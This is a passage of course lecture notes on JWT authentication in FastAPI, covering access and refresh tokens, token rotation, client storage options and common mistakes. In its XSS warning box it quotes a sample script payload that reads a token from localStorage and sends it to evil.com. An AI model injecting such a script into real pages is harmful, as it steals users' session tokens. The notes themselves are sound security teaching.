│  ───[═══════════════]─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─ ─            │
│     │    VALID ✅    │        EXPIRED ❌                         │
│     │               │                                           │
│  jwt.decode() ✅    │  jwt.decode() 💥 ExpiredSignatureError    │
│  returns payload    │                                           │
│                     │                                           │
│  🛂 Just like a passport: valid until the printed expiry date. │
│     After that, border control rejects it.                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 3.5 Handling Invalid Tokens (JWTError, ExpiredSignature)

**Connection to error handling patterns from Week 1:**

> "Your exception handling skills from Week 1 and Week 3's HTTPException — same patterns, new exception classes."

```python
from jose import jwt, JWTError, ExpiredSignatureError

def verify_token(token: str) -> dict:
    """Verify a JWT and return its payload.
    
    Raises:
        HTTPException: If token is invalid or expired.
    """
    try:
        payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
        return payload
        
    except ExpiredSignatureError:
        # Token was valid but has expired — specific error
        raise HTTPException(
            status_code=401,
            detail="Token has expired",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    except JWTError:
        # Catch-all: bad signature, malformed token, wrong algorithm, etc.
        raise HTTPException(
            status_code=401,
            detail="Invalid token",
            headers={"WWW-Authenticate": "Bearer"},
        )
```

**Exception hierarchy:**

```
┌─────────────────────────────────────────────────────────────────┐
│               python-jose EXCEPTION TREE                        │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  JWTError (base)                                                │
│  ├─ JWTClaimsError                                              │
│  │   └─ ExpiredSignatureError   ← Token past its exp time      │
│  │                                                              │
│  └─ (other JWTError cases)                                      │
│      ├─ Invalid signature        ← SECRET_KEY mismatch / tamper│
│      ├─ Malformed token          ← Not a valid JWT string      │
│      └─ Algorithm mismatch       ← alg not in allowed list     │
│                                                                 │
│  CATCH ORDER MATTERS (Week 1 Lecture 2):                        │
│  ├─ Catch ExpiredSignatureError FIRST (specific)                │
│  └─ Catch JWTError SECOND (general fallback)                    │
│                                                                 │
│  If you catch JWTError first, ExpiredSignatureError             │
│  is swallowed — you lose the ability to tell the client         │
│  "your token expired" vs "your token is garbage."               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Why the `WWW-Authenticate` header?**

```python
# This header tells the client: "Authentication is required, and I expect Bearer tokens."
# It's part of the HTTP spec (RFC 6750) for OAuth2 Bearer token usage.
headers={"WWW-Authenticate": "Bearer"}
```

> "This is a protocol convention, not a FastAPI-specific thing. When a server rejects authentication, it should tell the client *how* to authenticate. The `WWW-Authenticate: Bearer` header says: 'Send me a Bearer token in the Authorization header.' Clients and tools like Swagger UI use this to know what to prompt for."

---

## 3.6 Completing the Login Endpoint (Lecture 1 → Tokens)

**Now we connect everything. Lecture 1 left us with a login that returned nothing useful. Let's fix it.**

**First, the response model — Pydantic from Week 3:**

```python
from pydantic import BaseModel

class TokenResponse(BaseModel):
    access_token: str
    token_type: str = "bearer"
    # refresh_token will be added in Part 4
```

**The token creation utility:**

```python
# auth/token.py
from datetime import datetime, timedelta, timezone
from jose import jwt

SECRET_KEY = "your-secret-key-from-env"  # TODO: move to pydantic-settings (Week 15)
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 15

def create_access_token(
    user_id: str,
    expires_delta: timedelta | None = None,
) -> str:
    """Create a signed JWT access token for a user."""
    
    now = datetime.now(timezone.utc)
    expire = now + (expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES))
    
    payload = {
        "sub": user_id,
        "exp": expire,
        "iat": now,
        "type": "access",
    }
    
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)
```

**Now update the login endpoint from Lecture 1:**

```python
# auth/router.py
from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.ext.asyncio import AsyncSession

router = APIRouter(prefix="/auth", tags=["auth"])

@router.post("/login", response_model=TokenResponse)
async def login(
    credentials: LoginRequest,
    db: AsyncSession = Depends(get_db),
) -> TokenResponse:
    # ── STEP 1: Verify credentials (this is Lecture 1 code) ──
    user = await user_repo.get_by_email(db, credentials.email)
    
    if not user or not verify_password(credentials.password, user.hashed_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid email or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # ── STEP 2: Create token (THIS IS NEW) ──
    access_token = create_access_token(user_id=str(user.id))
    
    # ── STEP 3: Return the token ──
    return TokenResponse(access_token=access_token)
```

**The full flow, visualized:**

```
┌─────────────────────────────────────────────────────────────────┐
│                  COMPLETE LOGIN FLOW                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Client                              Server                    │
│  ──────                              ──────                    │
│    │                                    │                       │
│    │ POST /auth/login                   │                       │
│    │ {"email": "a@b.com",              │                       │
│    │  "password": "secret123"}          │                       │
│    │ ──────────────────────────────────▶│                       │
│    │                                    │                       │
│    │                          ┌─────────┴─────────┐             │
│    │                          │ 1. Find user by   │             │
│    │                          │    email in DB     │             │
│    │                          │                    │             │
│    │                          │ 2. Verify password │             │
│    │                          │    with bcrypt     │             │
│    │                          │    (Lecture 1)     │             │
│    │                          │                    │             │
│    │                          │ 3. Create JWT      │             │
│    │                          │    with user.id    │             │
│    │                          │    as "sub"        │             │
│    │                          └─────────┬─────────┘             │
│    │                                    │                       │
│    │ 200 OK                             │                       │
│    │ {"access_token": "eyJhb...",       │                       │
│    │  "token_type": "bearer"}           │                       │
│    │ ◀──────────────────────────────────│                       │
│    │                                    │                       │
│    │                                    │                       │
│    │ GET /tasks                         │                       │
│    │ Authorization: Bearer eyJhb...     │                       │
│    │ ──────────────────────────────────▶│                       │
│    │                          ┌─────────┴─────────┐             │
│    │                          │ 4. Decode JWT     │             │
│    │                          │ 5. Extract user_id│             │
│    │                          │ 6. Fetch tasks    │             │
│    │                          │    for that user   │             │
│    │                          └─────────┬─────────┘             │
│    │ 200 OK                             │                       │
│    │ [{"title":"Buy milk"}, ...]        │                       │
│    │ ◀──────────────────────────────────│                       │
│    │                                    │                       │
│                                                                 │
│  NOTE: Step 4-6 (the protected endpoint) is Lecture 3.          │
│  We're showing the complete picture so you understand           │
│  WHERE your tokens go. You'll BUILD the protection next.        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

> "See the `Authorization: Bearer eyJhb...` header? That's how the client sends the token on every subsequent request. The word `Bearer` means 'whoever bears this token is authorized.' That's exactly like handing over your passport — whoever is holding it gets the access."

---

# PART 4: ACCESS & REFRESH TOKENS

## 4.1 The Single Token Problem

**Ask the class:**

> "Our access token expires in 15 minutes. That's great for security — if stolen, the damage window is short. But it's terrible for user experience. Imagine having to re-enter your password every 15 minutes. Would you use that app?"

```
┌─────────────────────────────────────────────────────────────────┐
│               THE EXPIRATION DILEMMA                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SHORT EXPIRATION (15 min):                                     │
│  ├─ ✅ Security: If stolen, attacker has 15 min max             │
│  └─ ❌ UX: User must re-login constantly                        │
│                                                                 │
│  LONG EXPIRATION (30 days):                                     │
│  ├─ ✅ UX: User stays logged in for a month                     │
│  └─ ❌ Security: If stolen, attacker has 30 DAYS of access      │
│                                                                 │
│  Neither option is acceptable.                                  │
│  We need BOTH short damage windows AND long user sessions.      │
│                                                                 │
│  The solution: TWO tokens with different jobs.                  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4.2 Two Tokens, Two Jobs

```
┌─────────────────────────────────────────────────────────────────┐
│              ACCESS TOKEN vs REFRESH TOKEN                      │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ACCESS TOKEN                     REFRESH TOKEN                 │
│  ────────────                     ─────────────                 │
│  Purpose: Prove identity          Purpose: Get new access token │
│  on every API request             when the old one expires      │
│                                                                 │
│  Lifetime: SHORT (15-30 min)      Lifetime: LONG (7-30 days)   │
│                                                                 │
│  Sent with: EVERY request         Sent to: ONE endpoint only   │
│  (Authorization header)           (POST /auth/refresh)          │
│                                                                 │
│  Exposure: HIGH                   Exposure: LOW                 │
│  (travels across network often)   (travels rarely)              │
│                                                                 │
│  If stolen: Damage is limited     If stolen: Can get new access │
│  (15 minutes of access)           tokens (more dangerous)       │
│                                                                 │
│  Stored: Memory / short-lived     Stored: httpOnly cookie or    │
│  storage                          secure storage                │
│                                                                 │
│                                                                 │
│  🛂 ACCESS TOKEN = Day pass at a conference                     │
│     Shows your name and access level. You flash it at every     │
│     door. Expires at end of day. Easy to steal if visible.      │
│                                                                 │
│  🛂 REFRESH TOKEN = Conference registration confirmation        │
│     You keep it safely in your bag. If you lose your day pass,  │
│     you go to the registration desk and show this to get a      │
│     new day pass. You rarely take it out.                       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4.3 The Complete Flow (Diagram)

```
┌─────────────────────────────────────────────────────────────────┐
│             ACCESS + REFRESH TOKEN FLOW                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Client                              Server                    │
│  ──────                              ──────                    │
│    │                                    │                       │
│    │ ① POST /auth/login                 │                       │
│    │   (email + password)               │                       │
│    │───────────────────────────────────▶│                       │
│    │                                    │ verify credentials    │
│    │◀───────────────────────────────────│                       │
│    │   access_token  (15 min)           │                       │
│    │   refresh_token (7 days)           │                       │
│    │                                    │                       │
│    │ ② GET /tasks                       │                       │
│    │   Authorization: Bearer <access>   │                       │
│    │───────────────────────────────────▶│                       │
│    │◀───────────────────────────────────│ verify access token   │
│    │   200 OK: your tasks               │                       │
│    │                                    │                       │
│    │     ... 15 minutes pass ...        │                       │
│    │                                    │                       │
│    │ ③ GET /tasks                       │                       │
│    │   Authorization: Bearer <access>   │                       │
│    │───────────────────────────────────▶│                       │
│    │◀───────────────────────────────────│ access token EXPIRED  │
│    │   401: Token has expired           │                       │
│    │                                    │                       │
│    │ ④ POST /auth/refresh               │                       │
│    │   {"refresh_token": "<refresh>"}   │                       │
│    │───────────────────────────────────▶│                       │
│    │                                    │ verify refresh token  │
│    │◀───────────────────────────────────│ issue NEW pair        │
│    │   NEW access_token  (15 min)       │                       │
│    │   NEW refresh_token (7 days)       │                       │
│    │                                    │                       │
│    │ ⑤ GET /tasks (retry with new token)│                       │
│    │   Authorization: Bearer <new_acc>  │                       │
│    │───────────────────────────────────▶│                       │
│    │◀───────────────────────────────────│                       │
│    │   200 OK: your tasks               │                       │
│    │                                    │                       │
│                                                                 │
│  The user NEVER re-enters their password (for up to 7 days).   │
│  But stolen access tokens only work for 15 minutes.             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

> "Notice step ④: the client sends the *refresh token*, not the password. The server verifies the refresh token's signature and expiration, then issues a completely new pair. The old access token is dead. The old refresh token is also replaced — that's token rotation, which we'll cover in 4.6."

---

## 4.4 Building the Token Pair

**We need separate creation functions because the two tokens differ in expiration, type claim, and (optionally) secret key:**

```python
# auth/token.py
from datetime import datetime, timedelta, timezone
from jose import jwt, JWTError, ExpiredSignatureError

SECRET_KEY = "your-secret-key-from-env"
REFRESH_SECRET_KEY = "a-different-secret-key"  # separate key for refresh tokens!
ALGORITHM = "HS256"
ACCESS_TOKEN_EXPIRE_MINUTES = 15
REFRESH_TOKEN_EXPIRE_DAYS = 7


def create_access_token(
    user_id: str,
    expires_delta: timedelta | None = None,
) -> str:
    """Create a short-lived access token."""
    
    now = datetime.now(timezone.utc)
    expire = now + (expires_delta or timedelta(minutes=ACCESS_TOKEN_EXPIRE_MINUTES))
    
    payload = {
        "sub": user_id,
        "exp": expire,
        "iat": now,
        "type": "access",   # ← This distinguishes access from refresh
    }
    
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)


def create_refresh_token(
    user_id: str,
    expires_delta: timedelta | None = None,
) -> str:
    """Create a long-lived refresh token."""
    
    now = datetime.now(timezone.utc)
    expire = now + (expires_delta or timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS))
    
    payload = {
        "sub": user_id,
        "exp": expire,
        "iat": now,
        "type": "refresh",  # ← Different type!
    }
    
    # Different secret key! Even if access key is compromised,
    # attacker can't forge refresh tokens.
    return jwt.encode(payload, REFRESH_SECRET_KEY, algorithm=ALGORITHM)
```

**Why separate secret keys?**

```
┌─────────────────────────────────────────────────────────────────┐
│              WHY TWO SECRET KEYS?                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Defense in depth. If an attacker somehow leaks your            │
│  ACCESS secret key (misconfigured logging, memory dump, etc.),  │
│  they can forge access tokens — but NOT refresh tokens.         │
│  They get 15-minute windows, not 7-day sessions.                │
│                                                                 │
│  ACCESS_SECRET_KEY ──▶ signs/verifies access tokens only       │
│  REFRESH_SECRET_KEY ──▶ signs/verifies refresh tokens only     │
│                                                                 │
│  Two locks, two keys. Losing one doesn't open both doors.       │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Why the `type` claim matters:**

```python
# Without the "type" claim, a refresh token could be used as an access token!
# Both are valid JWTs signed by your server.

# DANGER: Attacker steals a refresh_token and sends it as:
# Authorization: Bearer <refresh_token>
# Server decodes it → valid signature → grants access!

# WITH the "type" claim, your verification code checks:
def verify_access_token(token: str) -> dict:
    payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    
    if payload.get("type") != "access":
        raise HTTPException(status_code=401, detail="Invalid token type")
    
    return payload

# Now a refresh token used as an access token → rejected.
# And vice versa.
```

```
┌─────────────────────────────────────────────────────────────────┐
│             TOKEN TYPE ENFORCEMENT                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Access endpoint receives token:                                │
│    type == "access"?  → ✅ proceed                              │
│    type == "refresh"? → ❌ reject (wrong token type)            │
│    type missing?      → ❌ reject (malformed)                   │
│                                                                 │
│  Refresh endpoint receives token:                               │
│    type == "refresh"? → ✅ proceed                              │
│    type == "access"?  → ❌ reject (wrong token type)            │
│    type missing?      → ❌ reject (malformed)                   │
│                                                                 │
│  This is a second layer of defense ON TOP OF separate keys.     │
│  Belt AND suspenders.                                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**Now update the login endpoint and response model:**

```python
# schemas.py
class TokenResponse(BaseModel):
    access_token: str
    refresh_token: str
    token_type: str = "bearer"

class RefreshRequest(BaseModel):
    refresh_token: str
```

```python
# auth/router.py — updated login
@router.post("/login", response_model=TokenResponse)
async def login(
    credentials: LoginRequest,
    db: AsyncSession = Depends(get_db),
) -> TokenResponse:
    # Step 1: Verify credentials (unchanged from Lecture 1)
    user = await user_repo.get_by_email(db, credentials.email)
    
    if not user or not verify_password(credentials.password, user.hashed_password):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid email or password",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # Step 2: Create BOTH tokens
    user_id = str(user.id)
    access_token = create_access_token(user_id=user_id)
    refresh_token = create_refresh_token(user_id=user_id)
    
    # Step 3: Return the pair
    return TokenResponse(
        access_token=access_token,
        refresh_token=refresh_token,
    )
```

---

## 4.5 The Refresh Endpoint

**This endpoint exchanges a valid refresh token for a new token pair:**

```python
@router.post("/refresh", response_model=TokenResponse)
async def refresh_tokens(
    request: RefreshRequest,
    db: AsyncSession = Depends(get_db),
) -> TokenResponse:
    """Exchange a refresh token for a new access + refresh token pair."""
    
    # ── Step 1: Decode and verify the refresh token ──
    try:
        payload = jwt.decode(
            request.refresh_token,
            REFRESH_SECRET_KEY,          # ← refresh key, not access key!
            algorithms=[ALGORITHM],
        )
    except ExpiredSignatureError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Refresh token has expired. Please log in again.",
            headers={"WWW-Authenticate": "Bearer"},
        )
    except JWTError:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid refresh token",
            headers={"WWW-Authenticate": "Bearer"},
        )
    
    # ── Step 2: Verify it's actually a refresh token ──
    if payload.get("type") != "refresh":
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="Invalid token type",
        )
    
    # ── Step 3: Verify the user still exists (and isn't banned) ──
    user_id = payload.get("sub")
    user = await user_repo.get_by_id(db, user_id)
    
    if not user:
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail="User no longer exists",
        )
    
    # You could also check: is the user banned? is the account deactivated?
    
    # ── Step 4: Issue a fresh pair ──
    new_access = create_access_token(user_id=str(user.id))
    new_refresh = create_refresh_token(user_id=str(user.id))
    
    return TokenResponse(
        access_token=new_access,
        refresh_token=new_refresh,
    )
```

**Why Step 3 matters — checking the database:**

> "Wait, didn't we say tokens are stateless — no database lookups? Yes, for access tokens. But the refresh endpoint is called *rarely* (once every 15 minutes at most). A single DB lookup here is completely acceptable. It's your chance to check: does this user still exist? Have they been banned since the token was issued? Did an admin revoke their access?"

```
┌─────────────────────────────────────────────────────────────────┐
│              WHEN TO HIT THE DATABASE                           │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ACCESS TOKEN VERIFICATION:                                     │
│  ├─ Called on EVERY request (100s-1000s per minute)              │
│  ├─ Verify signature + expiration only (stateless, fast)        │
│  └─ No DB lookup ← this is the whole point of JWT              │
│                                                                 │
│  REFRESH TOKEN VERIFICATION:                                    │
│  ├─ Called RARELY (once per access token lifetime)               │
│  ├─ Verify signature + expiration (stateless check first)       │
│  └─ THEN DB lookup ← check user still valid (acceptable cost)  │
│                                                                 │
│  This is the pragmatic middle ground.                           │
│  Pure statelessness for high-frequency access checks.           │
│  One DB lookup for low-frequency refresh operations.            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 4.6 Token Rotation (Detecting Theft)

**Token rotation is a security pattern: each refresh operation invalidates the old refresh token.**

> "Right now our refresh endpoint issues new tokens but doesn't invalidate the old refresh token. That means if an attacker steals a refresh token, they can keep using it in parallel with the legitimate user. Token rotation fixes this."

```
┌─────────────────────────────────────────────────────────────────┐
│                 WITHOUT ROTATION                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Day 1: Login → Refresh token R1 (valid 7 days)                │
│  Day 2: Attacker steals R1                                      │
│                                                                 │
│  Day 3: User refreshes with R1 → gets new access token         │
│         Attacker refreshes with R1 → ALSO gets access token!   │
│                                                                 │
│  Both R1 copies work. Server can't tell them apart.             │
│  Attacker has access until Day 8 (when R1 expires).             │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

```
┌─────────────────────────────────────────────────────────────────┐
│                 WITH ROTATION                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Day 1: Login → Refresh token R1 (stored in DB, valid 7 days)  │
│  Day 2: Attacker steals R1                                      │
│                                                                 │
│  Day 3, Scenario A — User refreshes first:                      │
│    User sends R1 → Server issues R2, MARKS R1 AS USED          │
│    Attacker sends R1 → Server sees R1 is ALREADY USED          │
│    ⚠️ REUSE DETECTED → Server revokes ALL tokens for this user │
│    Both user and attacker are logged out. User must re-login.   │
│                                                                 │
│  Day 3, Scenario B — Attacker refreshes first:                  │
│    Attacker sends R1 → Server issues R2' to attacker,          │
│                         MARKS R1 AS USED                        │
│    User sends R1 → Server sees R1 is ALREADY USED              │
│    ⚠️ REUSE DETECTED → Server revokes ALL tokens for this user │
│    Again, both are logged out. Attacker's R2' is now invalid.  │
│                                                                 │
│  EITHER WAY: reuse of a refresh token triggers a security      │
│  alarm and invalidates everything. Inconvenient for the user,   │
│  but FAR better than 7 days of attacker access.                │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**How to implement rotation (conceptual — full implementation in the project):**

```python
# You need a database table or store to track issued refresh tokens:
#
# Table: refresh_tokens
# ├─ id (PK)
# ├─ user_id (FK → users)
# ├─ token_jti (unique identifier for this token — "JWT ID")
# ├─ is_used (boolean, default false)
# ├─ is_revoked (boolean, default false)
# ├─ expires_at (timestamp)
# └─ created_at (timestamp)

# In the refresh endpoint:
# 1. Decode the refresh token → extract "jti" claim
# 2. Look up the jti in the database
# 3. If is_used == True → THEFT DETECTED → revoke ALL tokens for this user
# 4. If is_used == False → mark as used, issue new pair with new jti
```

**Adding `jti` (JWT ID) to our tokens:**

```python
import uuid

def create_refresh_token(
    user_id: str,
    expires_delta: timedelta | None = None,
) -> tuple[str, str]:
    """Create a refresh token. Returns (token_string, jti)."""
    
    now = datetime.now(timezone.utc)
    expire = now + (expires_delta or timedelta(days=REFRESH_TOKEN_EXPIRE_DAYS))
    
    jti = str(uuid.uuid4())  # Unique ID for this specific token
    
    payload = {
        "sub": user_id,
        "exp": expire,
        "iat": now,
        "type": "refresh",
        "jti": jti,           # ← Each refresh token gets a unique ID
    }
    
    token = jwt.encode(payload, REFRESH_SECRET_KEY, algorithm=ALGORITHM)
    return token, jti  # Return both — save jti to database
```

> "Full rotation implementation belongs in your project. In Week 10, you'll learn Redis — which is ideal for tracking used refresh tokens because of its built-in TTL. A used token record only needs to exist until the token's natural expiration, then Redis auto-deletes it. For now, a database table works."

---

# PART 5: CLIENT-SIDE STORAGE & SECURITY

## 5.1 Where Tokens Live (Client-Side Reality)

> "We've been building server-side code. But think about the other half: the client received two tokens after login. Where does it PUT them? This is a frontend concern, but as a backend developer you must understand it — because your choice of token delivery mechanism affects your security architecture."

```
┌─────────────────────────────────────────────────────────────────┐
│              THE CLIENT'S PROBLEM                               │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  After POST /auth/login, client has:                            │
│  {                                                              │
│    "access_token": "eyJhb...",                                  │
│    "refresh_token": "eyJzdW...",                                │
│    "token_type": "bearer"                                       │
│  }                                                              │
│                                                                 │
│  The client must:                                               │
│  1. Store both tokens somewhere (persist across page reloads)   │
│  2. Attach access token to every API request                    │
│  3. Use refresh token when access token expires                 │
│  4. Keep both tokens SAFE from attackers                        │
│                                                                 │
│  Where to store them? Three options. None is perfect.           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5.2 Storage Options Compared

```
┌─────────────────────────────────────────────────────────────────┐
│                                                                 │
│  OPTION 1: localStorage                                         │
│  ──────────────────────                                         │
│  ├─ How:  localStorage.setItem("access_token", token)           │
│  ├─ ✅ Simple. Persists across tabs and reloads.                │
│  ├─ ✅ Easy to attach to requests (read from JS, set header)    │
│  ├─ ❌ Accessible to ANY JavaScript on the page                 │
│  └─ ❌ If an XSS attack injects JS → tokens are stolen          │
│                                                                 │
│  Risk: XSS (Cross-Site Scripting)                               │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  OPTION 2: httpOnly Cookie                                      │
│  ────────────────────────                                       │
│  ├─ How:  Server sets Set-Cookie: token=...; HttpOnly; Secure   │
│  ├─ ✅ JavaScript CANNOT read it (HttpOnly flag)                │
│  ├─ ✅ Automatically sent with every request to your domain     │
│  ├─ ❌ Requires CSRF protection (cookie sent automatically!)    │
│  └─ ❌ More complex to implement (cookie config, CORS, SameSite)│
│                                                                 │
│  Risk: CSRF (Cross-Site Request Forgery)                        │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  OPTION 3: JavaScript Memory (variable)                         │
│  ──────────────────────────────────────                         │
│  ├─ How:  const token = response.access_token; (in JS variable) │
│  ├─ ✅ Most secure — not accessible after page unloads          │
│  ├─ ✅ Not in localStorage, not in cookies                      │
│  ├─ ❌ Lost on page refresh (user must re-auth or use refresh)  │
│  └─ ❌ Only practical for SPAs with silent refresh flows        │
│                                                                 │
│  Risk: Minimal (but worst UX)                                   │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**The pragmatic answer for most API backends:**

```
┌─────────────────────────────────────────────────────────────────┐
│             RECOMMENDED APPROACH                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  For APIs consumed by SPAs (React, Vue, etc.):                  │
│  ├─ Access token → In-memory (JS variable)                      │
│  ├─ Refresh token → httpOnly Secure cookie                      │
│  └─ Silent refresh on page load (automatic re-auth)             │
│                                                                 │
│  For APIs consumed by mobile apps:                              │
│  ├─ Access token → Secure device storage (Keychain, Keystore)   │
│  └─ Refresh token → Secure device storage                       │
│                                                                 │
│  For server-to-server (API keys, not user auth):                │
│  └─ Different mechanism entirely (API keys, OAuth client creds) │
│                                                                 │
│  For this course: we send tokens in JSON response body.         │
│  The client (Swagger UI, httpx, frontend) decides storage.      │
│  Your backend's job: issue good tokens, verify them correctly.  │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5.3 Attack Awareness (XSS, Token Theft)

> "You'll go deeper into OWASP and web security in Lecture 4. For now, understand the two attacks that specifically target tokens:"

```
┌─────────────────────────────────────────────────────────────────┐
│                   XSS (Cross-Site Scripting)                    │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  What: Attacker injects malicious JavaScript into your page.    │
│  How:  User input rendered without sanitization. Attacker       │
│        submits: <script>fetch('evil.com?t='+localStorage.       │
│        getItem('token'))</script>                               │
│  Effect: Script runs in user's browser, reads localStorage,     │
│          sends tokens to attacker's server.                     │
│                                                                 │
│  Why it matters for JWT: If tokens are in localStorage,         │
│  XSS can steal them silently.                                   │
│                                                                 │
│  Mitigation:                                                    │
│  ├─ Never store tokens in localStorage (use httpOnly cookies)   │
│  ├─ Sanitize all user input (frontend responsibility)           │
│  ├─ Content-Security-Policy headers (Lecture 4)                 │
│  └─ Short-lived access tokens limit damage window               │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

```
┌─────────────────────────────────────────────────────────────────┐
│             NETWORK INTERCEPTION                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  What: Attacker intercepts the token in transit (man-in-middle).│
│  How:  Unencrypted HTTP, compromised WiFi, packet sniffing.     │
│  Effect: Attacker captures the raw token and reuses it.         │
│                                                                 │
│  Mitigation:                                                    │
│  ├─ ALWAYS use HTTPS (TLS encrypts the entire connection)       │
│  ├─ Secure flag on cookies (only sent over HTTPS)               │
│  └─ Short-lived access tokens limit damage window               │
│                                                                 │
│  If you remember nothing else from this section:                │
│  HTTPS is non-negotiable. No exceptions.                        │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 5.4 Security Checklist

```
┌─────────────────────────────────────────────────────────────────┐
│               JWT SECURITY CHECKLIST                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  SECRET KEY                                                     │
│  ├─ □ Generated with secrets.token_hex(32) or stronger          │
│  ├─ □ Stored in environment variable, NOT in code               │
│  ├─ □ Different keys for access and refresh tokens              │
│  └─ □ Different keys per environment (dev ≠ prod)               │
│                                                                 │
│  TOKEN CREATION                                                 │
│  ├─ □ Access token: short expiry (15-30 minutes)                │
│  ├─ □ Refresh token: moderate expiry (7-30 days)                │
│  ├─ □ "type" claim distinguishes access from refresh            │
│  ├─ □ No sensitive data in payload (passwords, SSN, etc.)       │
│  └─ □ "sub" claim is user ID (not email — emails change)        │
│                                                                 │
│  TOKEN VALIDATION                                               │
│  ├─ □ algorithms parameter is a LIST, not string                │
│  ├─ □ ExpiredSignatureError caught before JWTError              │
│  ├─ □ Token type verified (access vs refresh)                   │
│  └─ □ 401 responses include WWW-Authenticate header             │
│                                                                 │
│  REFRESH FLOW                                                   │
│  ├─ □ Refresh endpoint checks user still exists in DB           │
│  ├─ □ Old refresh token invalidated on use (rotation)           │
│  └─ □ Reuse detection triggers full revocation                  │
│                                                                 │
│  TRANSPORT                                                      │
│  ├─ □ HTTPS in production (always)                              │
│  └─ □ Tokens never logged or printed in production              │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## Common Mistakes

### Mistake 1: Putting secrets in the payload

```python
# ❌ WRONG: Anyone can decode and read this!
payload = {
    "sub": "user_42",
    "email": "alice@example.com",
    "password": "secret123",        # 💀 NEVER!
    "credit_card": "4111-1111...",   # 💀 NEVER!
    "ssn": "123-45-6789",           # 💀 NEVER!
}

# ✅ CORRECT: Only non-sensitive identifiers
payload = {
    "sub": "user_42",   # Just the ID — look up details from DB when needed
    "type": "access",
    "exp": expire,
}
```

---

### Mistake 2: Hardcoding or using weak secret keys

```python
# ❌ TERRIBLE: Attacker guesses these in seconds
SECRET_KEY = "secret"
SECRET_KEY = "password123"
SECRET_KEY = "jwt-secret-key"
SECRET_KEY = "your-app-name"

# ❌ ALSO BAD: Committed to source control
SECRET_KEY = "a3f2b8c91d4e7f0a..."  # In your .py file, pushed to GitHub

# ✅ CORRECT: Generated properly, loaded from environment
import os
SECRET_KEY = os.getenv("JWT_SECRET_KEY")
if not SECRET_KEY:
    raise RuntimeError("JWT_SECRET_KEY environment variable not set")
```

---

### Mistake 3: Not distinguishing token types

```python
# ❌ WRONG: No "type" claim — refresh token accepted as access token
def create_token(user_id: str, expires: timedelta) -> str:
    payload = {"sub": user_id, "exp": datetime.now(timezone.utc) + expires}
    return jwt.encode(payload, SECRET_KEY, algorithm=ALGORITHM)

# Attacker uses long-lived refresh token as Bearer token → full access for 7 days!

# ✅ CORRECT: Always include and verify the type
def verify_access_token(token: str) -> dict:
    payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
    if payload.get("type") != "access":
        raise HTTPException(status_code=401, detail="Invalid token type")
    return payload
```

---

### Mistake 4: Setting access tokens to expire in days

```python
# ❌ WRONG: If this token is stolen, attacker has 30 days of access
ACCESS_TOKEN_EXPIRE = timedelta(days=30)

# ✅ CORRECT: Short-lived access, long-lived refresh
ACCESS_TOKEN_EXPIRE = timedelta(minutes=15)   # High-frequency, high-exposure
REFRESH_TOKEN_EXPIRE = timedelta(days=7)      # Low-frequency, low-exposure
```

---

### Mistake 5: Catching exceptions in the wrong order

```python
# ❌ WRONG: JWTError catches everything — ExpiredSignatureError never reached
try:
    payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
except JWTError:
    raise HTTPException(status_code=401, detail="Invalid token")
